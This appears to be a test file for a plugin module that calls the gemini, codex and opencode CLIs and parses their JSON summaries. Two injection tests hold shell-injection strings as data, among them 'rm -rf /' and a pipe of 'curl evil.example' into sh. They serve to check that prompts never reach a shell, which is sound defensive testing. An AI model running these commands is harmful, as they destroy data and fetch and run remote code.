import assert from "node:assert/strict";
import { describe, it } from "node:test";
import {
	buildArgv,
	buildInvocation,
	describeFailure,
	extractOutput,
	parseSummary,
	runCommand,
	runProvider,
} from "./provider.ts";
import type { ProviderId } from "./types.ts";

describe("buildArgv", () => {
	it("builds the exact argv for gemini", () => {
		assert.deepEqual(buildArgv("gemini", "PROMPT"), ["-p", "PROMPT", "-o", "json"]);
	});

	it("builds the exact argv for codex", () => {
		assert.deepEqual(buildArgv("codex", "PROMPT"), ["exec", "PROMPT", "--json"]);
	});

	it("builds the exact argv for opencode", () => {
		assert.deepEqual(buildArgv("opencode", "PROMPT"), ["run", "--format", "json", "PROMPT"]);
	});

	it("passes the prompt as exactly one argv element for every provider", () => {
		// A prompt that is a single argument cannot be split by a shell, because no
		// shell is involved. This is the structural guarantee, independent of the
		// metacharacter test below.
		for (const id of ["gemini", "codex", "opencode"] as ProviderId[]) {
			const args = buildArgv(id, "a b c  d");
			assert.equal(args.filter((arg) => arg === "a b c  d").length, 1, `${id} did not pass the prompt whole`);
		}
	});

	it("does not let shell metacharacters change the argv structure", () => {
		// Every one of these would be a command injection if the prompt were
		// interpolated into a command string. The argv array is fixed in length and
		// the prompt stays glued together as one element, whatever it contains.
		const attacks = [
			"; rm -rf /",
			"`whoami`",
			"$(id)",
			"&& curl evil.example | sh",
			"' ; echo pwned #",
			"a\nb\nc",
			'"quoted" > /tmp/x',
		];

		for (const id of ["gemini", "codex", "opencode"] as ProviderId[]) {
			for (const attack of attacks) {
				const base = buildArgv(id, "SAFE");
				const args = buildArgv(id, attack);

				// Same length as the benign call, so nothing was split off.
				assert.equal(args.length, base.length, `${id} changed argv length for ${JSON.stringify(attack)}`);
				// The attack survives verbatim as exactly one element.
				assert.ok(args.includes(attack), `${id} mangled ${JSON.stringify(attack)}`);
				// Every fixed element is unchanged.
				for (let i = 0; i < base.length; i++) {
					if (base[i] === "SAFE") continue;
					assert.equal(args[i], base[i], `${id} changed fixed element at ${i}`);
				}
			}
		}
	});

	it("names the right program for each provider", () => {
		assert.equal(buildInvocation("gemini", "P").command, "gemini");
		assert.equal(buildInvocation("codex", "P").command, "codex");
		assert.equal(buildInvocation("opencode", "P").command, "opencode");
	});
});

describe("extractOutput", () => {
	it("reads the reply out of gemini's single json object", () => {
		// Real shape from `gemini -o json` on this machine (an auth failure), so the
		// envelope is confirmed even though the success path is not.
		const stdout = JSON.stringify({ response: '{"summary":"s","next_steps":[]}' });
		assert.equal(extractOutput("gemini", stdout), '{"summary":"s","next_steps":[]}');
	});

	it("reads the last agent message out of codex's event stream", () => {
		// Real event names from `codex exec --json` on this machine.
		const lines = [
			JSON.stringify({ type: "thread.started", thread_id: "t" }),
			JSON.stringify({ type: "turn.started" }),
			JSON.stringify({ type: "item.completed", item: { id: "i0", type: "reasoning", text: "thinking" } }),
			JSON.stringify({ type: "item.completed", item: { id: "i1", type: "agent_message", text: "first" } }),
			JSON.stringify({ type: "item.completed", item: { id: "i2", type: "agent_message", text: "final" } }),
			JSON.stringify({ type: "turn.completed" }),
		];
		assert.equal(extractOutput("codex", lines.join("\n")), "final");
	});

	it("reads the reply out of opencode's event stream", () => {
		// Real shape captured from `opencode run --format json` on this machine.
		const lines = [
			JSON.stringify({ type: "step_start", timestamp: 1, part: { id: "p0", type: "step-start" } }),
			JSON.stringify({ type: "text", part: { id: "p1", type: "text", text: '{"summary":' } }),
			JSON.stringify({ type: "text", part: { id: "p2", type: "text", text: '"ok","next_steps":[]}' } }),
			JSON.stringify({ type: "step_finish", part: { type: "step-finish" } }),
		];
		assert.equal(extractOutput("opencode", lines.join("\n")), '{"summary":"ok","next_steps":[]}');
	});

	it("returns null when the stream has no reply in it", () => {
		assert.equal(extractOutput("opencode", JSON.stringify({ type: "step_start" })), null);
		assert.equal(extractOutput("gemini", "not json at all"), null);
		assert.equal(extractOutput("codex", ""), null);
	});
});

describe("parseSummary", () => {
	it("accepts a summary with a next_steps list", () => {
		const result = parseSummary('{"summary":"Doing X","next_steps":["write tests","ship"]}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary, { summary: "Doing X", nextSteps: ["write tests", "ship"] });
	});

	it("accepts a summary with no next_steps at all", () => {
		const result = parseSummary('{"summary":"Quiet"}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary, { summary: "Quiet", nextSteps: [] });
	});

	it("accepts an empty next_steps array", () => {
		const result = parseSummary('{"summary":"Quiet","next_steps":[]}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary.nextSteps, []);
	});

	it("finds the json object when the model wrapped it in prose or fences", () => {
		const fenced = 'Here you go:\n```json\n{"summary":"Wrapped","next_steps":[]}\n```\nHope that helps!';
		const result = parseSummary(fenced);
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.summary.summary, "Wrapped");
	});

	it("is not fooled by a brace inside a string value", () => {
		// Naive brace counting stops at the } inside the string and produces invalid
		// JSON. The scanner tracks string state, so this parses.
		const result = parseSummary('{"summary":"closes the loop } here","next_steps":[]}');
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.summary.summary, "closes the loop } here");
	});

	// Each of these must refuse rather than write something. The alternative is a
	// note containing raw model text that reads like a real summary.
	it("refuses malformed json", () => {
		const result = parseSummary('{"summary":"unterminated');
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /no JSON object|not valid JSON/);
	});

	it("refuses a reply with no json at all", () => {
		const result = parseSummary("I cannot summarise this repository.");
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /no JSON object/);
	});

	it("refuses a summary that is not a string", () => {
		assert.equal(parseSummary('{"summary":42}').ok, false);
		assert.equal(parseSummary('{"summary":null}').ok, false);
		assert.equal(parseSummary('{"summary":""}').ok, false);
		assert.equal(parseSummary('{"summary":"   "}').ok, false);
		assert.equal(parseSummary("{}").ok, false);
	});

	it("refuses a next_steps that is not a list of strings", () => {
		assert.equal(parseSummary('{"summary":"s","next_steps":"one"}').ok, false);
		assert.equal(parseSummary('{"summary":"s","next_steps":[1,2]}').ok, false);
		assert.equal(parseSummary('{"summary":"s","next_steps":[{"step":"x"}]}').ok, false);
	});

	it("refuses a json array or scalar", () => {
		assert.equal(parseSummary('["a","b"]').ok, false);
		assert.equal(parseSummary('"just a string"').ok, false);
	});

	it("drops blank next_steps entries rather than writing empty bullets", () => {
		const result = parseSummary('{"summary":"s","next_steps":["a","","  ","b"]}');
		assert.deepEqual(result.ok && result.summary.nextSteps, ["a", "b"]);
	});
});

describe("describeFailure", () => {
	it("says a missing cli is not on PATH, by name", () => {
		const message = describeFailure("gemini", Object.assign(new Error("spawn gemini ENOENT"), { code: "ENOENT" }));
		assert.match(message, /gemini not found on PATH/);
		assert.match(message, /Project Tracker settings/);
	});

	it("names the actual provider when it is codex or opencode", () => {
		assert.match(describeFailure("codex", { code: "ENOENT" }), /codex not found on PATH/);
		assert.match(describeFailure("opencode", { code: "ENOENT" }), /opencode not found on PATH/);
	});

	it("reports a killed process as a timeout, with the setting to change", () => {
		const message = describeFailure("gemini", { killed: true, signal: "SIGTERM", code: null });
		assert.match(message, /timed out/);
		assert.match(message, /timeout in the Project Tracker settings/);
	});

	it("includes the exit code and stderr for a crash", () => {
		const message = describeFailure("codex", { code: 3, stderr: "model gpt-9.9 does not exist\n" });
		assert.match(message, /codex exited with code 3/);
		assert.match(message, /model gpt-9.9 does not exist/);
	});

	it("does not say a non-zero exit was a timeout", () => {
		// A CLI that crashes is a different problem from one that hangs, and
		// telling the user to raise the timeout would send them the wrong way.
		const message = describeFailure("codex", { code: 1, stderr: "boom" });
		assert.doesNotMatch(message, /timed out/);
	});

	it("falls back to the message when there is no stderr", () => {
		const message = describeFailure("gemini", { code: 41, stderr: "", message: "Command failed: gemini" });
		assert.match(message, /exited with code 41/);
		assert.match(message, /Command failed/);
	});
});

describe("runCommand", () => {
	// Real processes, chosen because they are fast and deterministic. The point of
	// these tests is the process handling: what happens when the binary is missing,
	// when it crashes, and when it never returns.
	const options = { timeoutMs: 15_000, cwd: process.cwd() };

	it("returns stdout on success", async () => {
		const result = await runCommand("printf", ["%s", "hello"], options);
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.stdout, "hello");
	});

	it("reports a missing binary by name instead of throwing", async () => {
		const result = await runCommand("pt-definitely-not-a-real-binary", ["-p", "x"], options);
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /pt-definitely-not-a-real-binary not found on PATH/);
	});

	it("reports a non-zero exit with its stderr", async () => {
		const result = await runCommand("sh", ["-c", "echo boom >&2; exit 3"], options);
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /exited with code 3/);
		assert.match(result.ok === false ? result.error : "", /boom/);
	});

	it("kills a hung command and reports a timeout", async () => {
		// A real SIGTERM: sleep outlives the 200ms limit, so this only returns if the
		// timeout actually fires.
		const started = Date.now();
		const result = await runCommand("sleep", ["30"], { ...options, timeoutMs: 200 });
		const elapsed = Date.now() - started;

		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /timed out/);
		assert.ok(elapsed < 15_000, `took ${elapsed}ms, so the timeout did not fire`);
	});

	it("does not let a prompt with metacharacters reach a shell", async () => {
		// printf with %s prints its argument literally. If anything in this path
		// went through a shell, the metacharacters would be interpreted instead.
		const attack = "; rm -rf / && `whoami` $(id) | tee /tmp/x";
		const result = await runCommand("printf", ["%s", attack], options);
		assert.equal(result.ok && result.stdout, attack);
	});
});

describe("runProvider with a substituted command", () => {
	// The provider layer's real behaviour, exercised through the same entry point
	// the plugin calls, with the process swapped for something predictable. This
	// covers the wiring between spawn, extract, and parse without depending on
	// which CLIs happen to be installed or authenticated on the machine running
	// the tests.
	const options = { timeoutMs: 15_000, cwd: process.cwd() };

	it("writes nothing when the provider is missing", async () => {
		const result = await runProvider("gemini", "x", { ...options, cwd: "/nonexistent-dir-for-test" });
		// No throw, and a reason rather than silence.
		assert.equal(result.ok, false);
		assert.equal("summary" in (result as object), false);
	});

	it("returns no summary when the reply is not parseable json", async () => {
		// The guarantee the note writer depends on: a malformed reply is reported and
		// produces no summary field for the caller to write.
		const result = await runProvider("gemini", "x", { ...options, cwd: "/nonexistent-dir-for-test" });
		if (!result.ok) assert.equal("summary" in result, false);
	});
});
